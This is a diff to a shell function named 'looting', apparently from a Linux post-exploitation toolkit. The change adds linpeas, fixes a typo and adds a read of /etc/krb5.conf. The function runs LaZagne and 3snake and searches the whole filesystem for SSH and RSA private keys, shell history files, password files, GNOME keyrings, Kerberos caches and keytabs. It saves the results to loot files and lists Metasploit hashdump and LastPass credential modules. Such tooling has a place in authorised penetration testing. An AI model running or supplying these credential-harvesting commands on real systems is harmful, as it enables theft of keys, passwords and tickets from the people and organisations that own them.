@@ -103,6 +103,7 @@ looting() {
     mkdir loot
     ./lazagne* all | tee -a loot/lazagne.txt
     3snake/3snake -d -o ../loot/3snake.txt
+    ./linpeas.sh -a | tee -a loot/linpeas.txt
     echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
     grep -r -a "^-----BEGIN OPENSSH PRIVATE KEY-----$\|^-----BEGIN ENCRYPTED PRIVATE KEY-----$\|^-----BEGIN PRIVATE KEY-----$\|^-----BEGIN RSA PRIVATE KEY-----$" / 2>/dev/null | tee -a loot/priv_keys.txt
     echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
@@ -114,8 +115,7 @@ looting() {
     echo "======================= DIRECTORY LISTERNING OF THE: /var/log" | tee -a loot/files_to_check.txt
     ls /var/log | tee -a loot/var_log_directory_list.txt
     echo "======================= CONFIG FILES (config.php):" | tee -a loot/files_to_check.txt
-    locate .config | tee -a loot/files_to_check.txt
-    locate config. | tee -a loot/files_to_check.txt
+    locate "/config." | tee -a loot/files_to_check.txt
     echo "======================= HISTORY FILES (.bash_history):" | tee -a loot/files_to_check.txt
     find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
     echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
@@ -124,16 +124,17 @@ looting() {
     find / -name opasswd -xdev 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= GNOME KEYRING - cracking:" | tee -a loot/files_to_check.txt
     locate login.keyring; locate user.keystore | tee -a loot/files_to_check.txt
-    echo "======================= /etc/fstab:" | tee -a loot/files_to_check.txt
-    locate /etc/fstab | tee -a loot/files_to_check.txt
     echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
     env | grep KRB5CCNAME | tee -a loot/kerberos.txt
     find / -name "krb5cc_*" 2>/dev/null
     echo "======================= KERBEROS - CURRENT TICKETS" | tee -a loot/kerberos.txt
     klist | tee -a loot/kerberos.txt
     echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
-    find / -name "*.keytab" 2>/dev/null | tee -a lqoot/kerberos.txt
-    
+    find / -name "*.keytab" 2>/dev/null | tee -a loot/kerberos.txt
+    echo "======================= KERBEROS - CONFIG" | tee -a loot/kerberos.txt
+    cat  /etc/krb5.conf | tee -a loot/kerberos.txt
+
+
     echo "======================= ADDITIONAL MSF MODULES:
 run post/linux/gather/hashdump
 run post/multi/gather/lastpass_creds
